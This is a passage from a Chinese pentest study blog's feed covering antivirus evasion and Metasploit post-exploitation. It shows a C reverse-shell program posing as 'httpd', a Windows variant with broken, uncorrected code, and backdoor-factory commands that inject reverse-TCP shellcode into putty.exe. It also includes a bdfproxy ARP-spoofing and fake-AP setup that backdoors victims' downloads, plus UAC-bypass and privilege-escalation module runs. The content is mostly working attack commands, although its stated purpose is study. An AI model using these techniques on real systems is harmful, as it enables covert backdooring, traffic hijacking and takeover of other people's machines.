class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>windows.c</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure><p><img src="20190413174154985.png" alt="在这里插入图片描述"></p><h4 id="后门工具–Backdoor-factory"><a href="#后门工具–Backdoor-factory" class="headerlink" title="后门工具–Backdoor-factory"></a>后门工具–Backdoor-factory</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>patch<ul><li>通过替换 exe、dll、注册表等方法修复系统漏洞或问题的方法</li><li>bdf：向二进制文件中增加或者删除代码内容<ul><li>某些受保护的二进制程序无法 patch</li><li>存在一定概率问价你会被 patch 坏掉</li></ul></li></ul></li><li>后门工厂<ul><li>使用于 windows PE x32/64 和 linux ELF x32/64 （OSX）</li><li>支持 msf payload、自定义 payload</li></ul></li><li>将 shellcode 代码 patch 进模板文件，躲避 AV 检查</li><li>python 语言编写</li><li>msf 使用的 patch 方法<ul><li>覆盖程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp</li></ul></li><li>创建新的线程执行 shellcode 并跳回原程序入口<ul><li>msfvenom -p windows/shell/reverse_tcp –k</li><li>增加代码片段跳转执行后跳回源程序入口</li></ul></li></ul></li><li>CTP 方法<ul><li>增加新的代码段 session，与 smf 的-k 方法类似</li><li>使用现有的代码裂缝/洞（code cave）存放 shellcode</li></ul></li><li>代码洞<ul><li>二进制中超过两个字节的连续 x00 区域（代码片段间区域）</li><li>根据统计判断代码洞是编译在进行编译是造成的，不同的编译器造成的代码洞的大小不同</li></ul></li><li>单个代码洞代销不足以存放完整的 shellcode<ul><li>多代码洞跳转（非顺序执行）<ul><li>初期免杀率可达100%</li></ul></li><li>结合 msf 的 stager 方法</li></ul></li><li>patch 选项<ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码注入</li></ul></li><li>BDF 基本使用<ul><li>检查二进制文件是否支持代码注入<ul><li>backdoor-factory -f putty.exe –S</li></ul></li><li>显示可用 payload<ul><li>backdoor-factory -f putty.exe -s show</li><li>backdoor-factory -f <code>which nc</code> -s show</li><li>backdoor-factory -f putty.exe -s show iat_reverse_tcp_stager_threaded -H 10.10.10.133 -P 4444</li><li>默认单一代码洞，选项 .rdata –&gt; 查看文件 –&gt; 查病毒</li><li>使用 msf 侦听 set payload windows/meterpreter/revers_tcp set LHOST 10.10.10.131 set LPORT 4444 run</li></ul></li><li>查看 cave 大小<ul><li>ackdoor-factory -f putty.exe -c -l</li></ul></li></ul></li><li>免杀效果对比<ul><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</li><li>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.20.8 -P 6666 -a</li></ul></li><li>与 veil-evasion 集成</li><li>Linux：backdoor-factory -f putty.exe -s show</li><li>IAT：import address table</li><li>指针指向 WinAPI 地址，被称为 thunks （形实转换程序），地址预定义</li></ul><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>-S：检查二进制文件是否支持代码注入</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe –S</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-c: 在确定其支持patch 后，我们再来查看其是否支持我们指定的 shellcode patch</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure><ul><li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure><ul><li><p>注入 putty.exe，报错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li><p>显示未找到文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure></li><li><p>修复错误（备份并重命名）</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure></li><li><p>使用 msf 侦听</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure></li><li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p></li><li><p>免杀效果比较</p><p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty3.exe</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty4.exe –J</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty5.exe -a</span><br></pre></td></tr></table></figure><ul><li><p>与 veil-evasion 集成</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil-evasion</span><br><span class="line">[<span class="symbol">menu&gt;&gt;</span>]: <span class="link">list</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li>Bdfproxy（mitmproxy）<ul><li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li></ul></li><li>步骤<ul><li>sysctl -w net.ipv4.ip_forward=1</li><li>iptables -t nat -A PREROUTING -p tcp –dport 80/443 -j REDIRECT –to-ports 8080</li><li>vi /etc/bdfproxy/bdfproxy.cfg<ul><li>proxyMode = transparent<br>修改侦听 IP 地址bdfproxy</li></ul></li></ul></li><li>arpspoof -i eth0 -t 1.1.1.2 1.1.1.1</li><li>启动 msf</li><li>流程<ul><li>mana 创建 Fack AP</li><li>badfproxy 代理注入代码</li><li>msf 侦听反弹 shell</li></ul></li></ul><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul><li><p>修改 IP 转发</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vim /etc/sysctl.conf </span></span><br><span class="line">net.ipv4.ip_forward=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>修改 iptables</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure></li><li><p>修改配置文件</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# vim /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent  </span><br><span class="line">HOST = <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>     #<span class="number">108</span>行，<span class="number">117</span>行，<span class="number">128</span>行，替换所有的，有<span class="number">6</span>个</span><br></pre></td></tr></table></figure></li><li><p>启动 bdfproxy</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># bdfproxy</span></span><br></pre></td></tr></table></figure></li><li><p>启动 msfconsole</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole -r /root/bdfproxy_msf_resource.rc</span></span><br><span class="line">msf exploit(multi/handler) &gt; jobs</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>arp 欺骗</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# arpspoof -i eth0 -t <span class="number">10.10</span><span class="number">.10</span><span class="number">.133</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure></li><li><p>靶机访问浏览器下载软件，并运行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/1qLFgFZ.png)</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul><li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p><ul><li>修改无线 SSID 名称</li></ul></li><li><p>./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</p><ul><li>修改 wlan1 无线网卡适配器并启动</li><li>iptables -t nat -A PREROUTING -i $phy -p tcp –dport 80/443 -j REDIRECT –to-port 8080</li></ul></li><li><p>vi /etc/bdfproxy/bdfproxy.cfg</p><ul><li>proxyMode = transparent</li><li>修改侦听 IP 地址并启动 badfproxy</li></ul></li><li><p>启动 msf</p><ul><li>msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</li></ul></li><li><p>补充内容</p><ul><li>全站 HTTPS 防注入（微软每个补丁都带码）</li><li>PE 文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<ul><li>全部用 0 覆盖</li><li>BDF 默认清除数字签名</li></ul></li></ul></li><li><p><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></p><ul><li>这是允许访问所有Sysinternals公用程序的文件共享。我们已经开发了这个功能来测试我们实用程序的替代分配机制。</li><li>这将允许您从任何连接到互联网的计算机运行这些工具，而无需导航到网页，下载并解压zip文件。</li></ul></li><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/" target="_blank" rel="noopener">Sysinternals网站</a></p><ul><li>Sysinternals网站由Mark Russinovich于1996年创建，主办他先进的系统实用程序和技术信息。无论您是IT专业人员还是开发人员，您都可以找到Sysinternals实用程序来帮助您管理，诊断和诊断Windows系统和应用程序。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;a href=&quot;#渗透测试——免杀部分知识&quot; class=&quot;headerlink&quot; title=&quot;渗透测试——免杀部分知识&quot;&gt;&lt;/a&gt;渗透测试——免杀部分知识&lt;/h2&gt;&lt;h4 id=&quot;1-恶意软件&quot;&gt;&lt;a href=&quot;#1-恶意软件&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>msf后渗透部分学习</title>
    <link href="https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</id>
    <published>2020-04-28T04:36:04.000Z</published>
    <updated>2020-11-25T09:15:08.943Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul><li><p>已经获得目标系统控制权后扩大战果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>永久后门</li></ul></li><li><p>基于已有 session 扩大战果</p><ul><li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set LHOST 10.0.0.128msf exploit(multi/handler) &gt; exploit -j<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>msf exploit(multi/handler) &gt; sessions </code></pre></li></ul></li></ul><h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions </p><h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p><hr><p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p><p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure><p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p><p>meterpreter &gt; background</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure><p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure><p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 